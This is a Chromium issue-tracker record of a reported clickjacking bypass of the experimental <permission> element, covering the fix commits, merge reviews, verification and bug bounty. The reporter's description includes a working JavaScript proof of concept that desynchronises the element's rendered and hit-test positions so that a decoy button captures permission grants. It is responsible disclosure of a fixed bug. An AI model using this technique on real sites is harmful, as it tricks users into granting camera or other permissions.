# Clickjack <permission> element

| Field | Value |
|-------|-------|
| **Issue ID** | [347509736](https://issues.chromium.org/issues/347509736) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Geometry |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ja...@gmail.com |
| **Assignee** | tu...@chromium.org |
| **Created** | 2024-06-17 |
| **Bounty** | $1,000.00 |

## Description

VULNERABILITY DETAILS

The `<permission>` element has special privileges because it has tightly controlled content and appearance controlled by the browser. However, these protections can be bypassed with clickjacking techniques.

VERSION
Chrome Version: 126.0.6478.62 + stable
Operating System: macOS Version 14.5 (Build 23F79)

REPRODUCTION CASE
<https://permission.site/pepc> - this is the public demo of <permission> from <https://developer.chrome.com/blog/permission-element-origin-trial>

Run the following via the console:

```
const { port1, port2 } = new MessageChannel();
port1.start();
port2.start();

function postTask(callback) {
  port1.addEventListener("message", () => callback(), { once: true });
  port2.postMessage("");
}

const jack = document.createElement("button");
jack.textContent = "Click-jacker";
document.querySelector(".content").append(jack);

Object.assign(jack.style, {
  position: "absolute",
  top: "0",
  left: "50%",
  translate: "-50% 0",
  width: "400px",
  pointerEvents: "none",
});

const camera = document.querySelector("#camera");
Object.assign(camera.style, {
  position: "relative",
  contain: "paint",
});

function frame() {
  Object.assign(camera.style, {
    width: "0",
    aspectRatio: "1/1",
    left: "-300px",
  });

  postTask(() => {
    Object.assign(camera.style, {
      width: "",
      aspectRatio: "",
      left: "",
    });
  });
  requestAnimationFrame(frame);
}

requestAnimationFrame(frame);

```

This code doesn't need to be run via the console for the exploit to work. It could be included in the page by the attacker.

The attack works by giving the `<permission>` element a different visual position (set via requestAnimationFrame) to its hit-test position (set via postTask). Any element can be put in the hit-test position. Meanwhile the actual `<permission>` erroneously passes the intersection test.

Mitigation should involve ensuring some rendering stability of the `<permission>` element.

Video of the reproduction attached.

CREDIT INFORMATION
Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: Jake Archibald

## Attachments

- [out.mp4](attachments/out.mp4) (video/mp4, 422.2 KB)

## Timeline

### en...@chromium.org (2024-06-17)

Thomas, can you please take a look?

### ja...@gmail.com (2024-06-17)

Although the other issue is also about clickjacking, the technique used is different. They're separate exploits that achieve the same goal.

### ja...@gmail.com (2024-06-18)

347588491 uses `-webkit-box-reflect`, which creates an area of ink overflow that doesn't seem to be tracked by the intersection observer. However, this issue uses the event loop to put elements in a particular place for rendering (using callbacks that run in the render steps - requestAnimationFrame), and place them somewhere else during task processing, which is where clicks are handled.

### pe...@google.com (2024-06-22)

Setting milestone because of s2 severity.

### tu...@chromium.org (2024-06-24)

It seems we missed the notification from intersection observations https://github.com/w3c/IntersectionObserver/issues/263. cc @wangxianzhu @szager


### ap...@google.com (2024-07-02)

Project: chromium/src
Branch: main

commit b45d131eeb3a693b1234898b3b6c48c304d73dc3
Author: Thomas Nguyen <tungnh@chromium.org>
Date:   Tue Jul 02 10:47:11 2024

    [PEPC] Disable PEPC if recalculating style causes layout change
    
    This CL complements the case in which the PEPC styling is changed,
    causing a move that but then move back instantaneously in
    requestAnimationFrame callback.
    Based on https://github.com/w3c/IntersectionObserver/issues/263, it
    seems like if the re-layout happen in the requestAnimationFrame
    callback, IntersectionObserver won't send us a notification about a
    visibility change event, even if the layout totally hides the PEPC.
    
    We had another measure, calculating the intersection rect with the
    viewport using lifecycle update events, but that didn't work either
    because the intersection rect with the viewport stayed the same.
    So, we're making sure that even styling changes that affect the
    intersection rect will trigger the cooldown time, no matter if they
    happen in requestAnimationFrame or not.
    
    Fixed: 347509736, 348359040
    Change-Id: I98dde8d42d696912d499b83be309630a1f4c9392
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5658195
    Reviewed-by: Yi Gu <yigu@chromium.org>
    Commit-Queue: Thomas Nguyen <tungnh@chromium.org>
    Reviewed-by: Mason Freed <masonf@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1322092}

M       third_party/blink/renderer/core/html/html_permission_element.cc
M       third_party/blink/renderer/core/html/html_permission_element.h
M       third_party/blink/renderer/core/html/html_permission_element_test.cc
M       tools/metrics/histograms/metadata/blink/enums.xml

https://chromium-review.googlesource.com/5658195


### pe...@google.com (2024-07-02)

Requesting merge to beta (M127) because latest trunk commit (1322092) appears to be after beta branch point (1313161).
Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.

### tu...@chromium.org (2024-07-03)

Hi jaffathecake, we've landed the fix to Canary, do you have any chance to see if it works?

### tu...@chromium.org (2024-07-03)

1.https://chromium-review.googlesource.com/c/chromium/src/+/5658195
2.Yes
3.No
4.No
5. Following the test steps in the description.

### ja...@gmail.com (2024-07-03)

Unfortunately I'm not going to be near my laptop until next week, but the
description of the fix sounds like it'll work. In terms of the bug bounty
system, is there anything I need to do?

On Wed, 3 Jul 2024, 08:43 , <buganizer-system@google.com> wrote:

> Replying to this email means your email address will be shared with the
> team that works on this product.
> https://issues.chromium.org/issues/347509736
>
> *Changed*
>
> *tu...@chromium.org <tu...@chromium.org> added comment #10
> <https://issues.chromium.org/issues/347509736#comment10>:*
> 1.https://chromium-review.googlesource.com/c/chromium/src/+/5658195
> 2.Yes
> 3.No
> 4.No
> 5. Following the test steps in the description.
> _______________________________
>
> *Reference Info: 347509736 Clickjack <permission> element*
> component:  Public Trackers > 1362134 > Chromium > Blink > Geometry
> <https://issues.chromium.org/components/1457003>
> status:  Fixed
> reporter:  jaffathecake@gmail.com
> assignee:  tu...@chromium.org
> cc:  an...@chromium.org, an...@google.com, en...@chromium.org, and 6 more
> collaborators:  se...@chromium.org
> type:  Vulnerability
> access level:  Limited visibility
> priority:  P1
> severity:  S2
> found in:  126
> hotlist:  external_security_report
> <https://issues.chromium.org/hotlists/5433527>, reward-topanel
> <https://issues.chromium.org/hotlists/5432096>, Security_Impact-Extended
> <https://issues.chromium.org/hotlists/5432548>, Unconfirmed
> <https://issues.chromium.org/hotlists/5437934>
> retention:  Component default
> Component Ancestor Tags:  Blink, Blink>Geometry
> Component Tags:  Blink>Geometry
> Merge-Request:  127
> Milestone:  127
> OS:  Linux, Mac, Windows, ChromeOS
>
>
> Generated by Google IssueTracker notification system.
>
> You're receiving this email because you are subscribed to updates on
> Google IssueTracker issue 347509736
> <https://issues.chromium.org/issues/347509736> where you have the roles:
> reporter, cc
> Unsubscribe from this issue.
> <https://issues.chromium.org/issues/347509736?unsubscribe=true>
>


### da...@google.com (2024-07-05)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), alonbajayo (ChromeOS), danielyip (Desktop)

### tu...@chromium.org (2024-07-08)

1. Change behavior for non-functional issues for Finch-gated features (PermissionElement)
2. https://chromium-review.googlesource.com/c/chromium/src/+/5674519
3. yes
4. Yes, new feature, behind a Finch flag. Origin Trial started in M126.
5
6. Not in stable.

### ja...@gmail.com (2024-07-10)

I've tested in the latest Canary, and the issue seems resolved.

### pg...@google.com (2024-07-11)

Marked medium severity and UI spoofing, but the demo video shows that the permission element can be used in a variety of ways to spoof and clickjack easily and believably. Also this all is gated behind the permissionElement finch flag.
Nothing relevant seen to this change in canary after more than a week of bake time.

Merge approved for M127! Please merge to branch 6533 by tomorrow Friday Jul 12 morning MTV time to get this change into M127 for the early release.

### ap...@google.com (2024-07-11)

Project: chromium/src
Branch: refs/branch-heads/6533

commit 4d0e9eaa7bbf43c6f31f2611182106d662cc9b54
Author: Thomas Nguyen <tungnh@chromium.org>
Date:   Thu Jul 11 16:00:40 2024

    [M127][PEPC] Disable PEPC if recalculating style causes layout change
    
    This CL complements the case in which the PEPC styling is changed,
    causing a move that but then move back instantaneously in
    requestAnimationFrame callback.
    Based on https://github.com/w3c/IntersectionObserver/issues/263, it
    seems like if the re-layout happen in the requestAnimationFrame
    callback, IntersectionObserver won't send us a notification about a
    visibility change event, even if the layout totally hides the PEPC.
    
    We had another measure, calculating the intersection rect with the
    viewport using lifecycle update events, but that didn't work either
    because the intersection rect with the viewport stayed the same.
    So, we're making sure that even styling changes that affect the
    intersection rect will trigger the cooldown time, no matter if they
    happen in requestAnimationFrame or not.
    
    (cherry picked from commit b45d131eeb3a693b1234898b3b6c48c304d73dc3)
    
    Fixed: 347509736, 348359040
    Change-Id: I98dde8d42d696912d499b83be309630a1f4c9392
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5658195
    Reviewed-by: Yi Gu <yigu@chromium.org>
    Commit-Queue: Thomas Nguyen <tungnh@chromium.org>
    Reviewed-by: Mason Freed <masonf@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1322092}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5674519
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
    Reviewed-by: Kouhei Ueno <kouhei@chromium.org>
    Cr-Commit-Position: refs/branch-heads/6533@{#1345}
    Cr-Branched-From: 7e0b87ec6b8cb5cb2969e1479fc25776e582721d-refs/heads/main@{#1313161}

M       third_party/blink/renderer/core/html/html_permission_element.cc
M       third_party/blink/renderer/core/html/html_permission_element.h
M       third_party/blink/renderer/core/html/html_permission_element_test.cc
M       tools/metrics/histograms/metadata/blink/enums.xml

https://chromium-review.googlesource.com/5674519


### pe...@google.com (2024-07-11)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### rz...@google.com (2024-07-23)

Labelling as not applicable for 120 LTS because the issue affects a new feature behind a finch flag and the origin trial started only in 126

### pe...@google.com (2024-07-23)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### sp...@google.com (2024-07-31)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
report of lower impact web platform privilege escalation involving primary permissions UI


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-07-31)

Thank you for the report! The reward amount was decided based on the lower impact of this issue and lower potential to user harm from this issue alone. Thanks for your efforts and reporting this issue to us.

### pe...@google.com (2024-09-23)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2024-09-23)

1. https://chromium-review.googlesource.com/c/chromium/src/+/5875742 and https://chromium-review.googlesource.com/c/chromium/src/+/5872510
2. Low, no conflicts
3. 127
4. Yes

### qk...@google.com (2024-09-24)

After talking with the patch author, I noticed that PEPC feature is not enabled by default. PEPC is still origin trial and needs to be enabled a specific args in command line to use the feature. So I think it doesn't match the criteria to LTS. So I mark LTS-NotApplicable-126 to this bug.

### pe...@google.com (2024-10-09)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/347509736)*
